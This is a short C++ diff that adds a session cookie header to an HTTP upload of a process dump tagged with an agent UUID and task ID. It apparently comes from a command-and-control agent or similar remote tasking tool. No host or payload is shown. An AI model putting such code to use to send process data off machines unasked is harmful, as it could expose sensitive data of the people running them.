@@ -53,6 +53,7 @@ namespace Task
         wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
         wHeaders += L"X-FILE: procdump\r\n";
+        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
 
         if (!System::Http::FileUpload(
             pState->pProcs,
